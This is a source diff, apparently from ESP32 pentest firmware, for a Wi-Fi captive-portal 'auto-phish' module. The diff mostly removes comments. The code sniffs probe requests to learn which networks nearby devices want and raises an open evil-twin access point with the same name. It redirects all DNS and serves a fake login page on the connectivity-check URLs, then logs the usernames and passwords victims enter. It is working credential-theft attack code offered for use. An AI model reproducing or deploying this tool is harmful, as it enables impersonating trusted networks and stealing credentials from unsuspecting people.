@@ -1,10 +1,3 @@
-// ═══════════════════════════════════════════════════════════
-// Arsenal - Captive Portal Auto-Phish
-// Detects what portal a connecting device expects
-// Auto-serves matching fake portal based on probe requests
-// Falls back to generic if no match found
-// ═══════════════════════════════════════════════════════════
-
 #include "arsenal.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
@@ -23,7 +16,7 @@ static String detectedSSID = "";
 static std::vector<String> probedSSIDs;
 static bool phishCapturing = false;
 
-// Probe request sniffer to detect what networks clients want
+
 static void phishProbeCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_MGMT || !phishCapturing) return;
 
@@ -32,10 +25,10 @@ static void phishProbeCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
     int len = pkt->rx_ctrl.sig_len;
     if (len < 24) return;
 
-    // Only probe requests (subtype 0x04)
+
     if ((frame[0] & 0xFC) != 0x40) return;
 
-    // Extract SSID
+
     int pos = 24;
     while (pos < len - 2) {
         uint8_t tagType = frame[pos];
@@ -48,7 +41,7 @@ static void phishProbeCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
                 if (c >= 32 && c <= 126) ssid += c;
             }
             if (ssid.length() > 0) {
-                // Add to list if not duplicate
+
                 bool exists = false;
                 for (auto &s : probedSSIDs) {
                     if (s == ssid) { exists = true; break; }
@@ -62,7 +55,7 @@ static void phishProbeCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
     }
 }
 
-// Generate a portal page that looks like it belongs to the detected network
+
 static String generatePhishPage(String ssid) {
     String page = R"rawliteral(
 <!DOCTYPE html>
@@ -112,7 +105,7 @@ void arsenal_captive_portal_autophish(void) {
         phishCredsCapture = 0;
         detectedSSID = "";
 
-        // Phase 1: Listen for probe requests to detect target SSIDs
+
         WiFi.mode(WIFI_STA);
         esp_wifi_set_promiscuous(true);
         esp_wifi_set_promiscuous_rx_cb(phishProbeCallback);
@@ -124,7 +117,7 @@ void arsenal_captive_portal_autophish(void) {
         tft.drawCentreString("Listening for probe requests...", tftWidth / 2, tftHeight / 2 - 10, 1);
         tft.drawCentreString("Sel to continue", tftWidth / 2, tftHeight / 2 + 10, 1);
 
-        // Channel hop while listening
+
         int ch = 1;
         while (true) {
             esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
@@ -153,7 +146,7 @@ void arsenal_captive_portal_autophish(void) {
             return;
         }
 
-        // Phase 2: Select target SSID
+
         options.clear();
         for (auto &ssid : probedSSIDs) {
             options.push_back({ssid, [&ssid]() {
@@ -164,16 +157,16 @@ void arsenal_captive_portal_autophish(void) {
 
         if (detectedSSID.length() == 0) return;
 
-        // Phase 3: Start AP with target name + captive portal
+
         WiFi.mode(WIFI_AP);
-        WiFi.softAP(detectedSSID.c_str(), "");  // Open network, same name
+        WiFi.softAP(detectedSSID.c_str(), "");
         delay(100);
 
-        // Start DNS server (redirect all DNS to us)
+
         dnsServer = new DNSServer();
         dnsServer->start(53, "*", WiFi.softAPIP());
 
-        // Start phishing web server
+
         String phishPage = generatePhishPage(detectedSSID);
         phishServer = new AsyncWebServer(80);
 
@@ -186,7 +179,7 @@ void arsenal_captive_portal_autophish(void) {
             logPhishCred(detectedSSID, user, pass);
             request->send(200, "text/html", "<html><body><h1>Connected!</h1><p>You're now online.</p></body></html>");
         });
-        // Captive portal detection endpoints
+
         phishServer->on("/generate_204", HTTP_GET, [phishPage](AsyncWebServerRequest *r) { r->send(200, "text/html", phishPage); });
         phishServer->on("/hotspot-detect.html", HTTP_GET, [phishPage](AsyncWebServerRequest *r) { r->send(200, "text/html", phishPage); });
         phishServer->on("/connecttest.txt", HTTP_GET, [phishPage](AsyncWebServerRequest *r) { r->send(200, "text/html", phishPage); });
@@ -194,7 +187,7 @@ void arsenal_captive_portal_autophish(void) {
 
         phishServer->begin();
 
-        // Phase 4: Monitor
+
         while (true) {
             dnsServer->processNextRequest();
 
@@ -233,7 +226,7 @@ void arsenal_captive_portal_autophish(void) {
             delay(300);
         }
 
-        // Cleanup
+
         phishServer->end();
         delete phishServer;
         phishServer = nullptr;
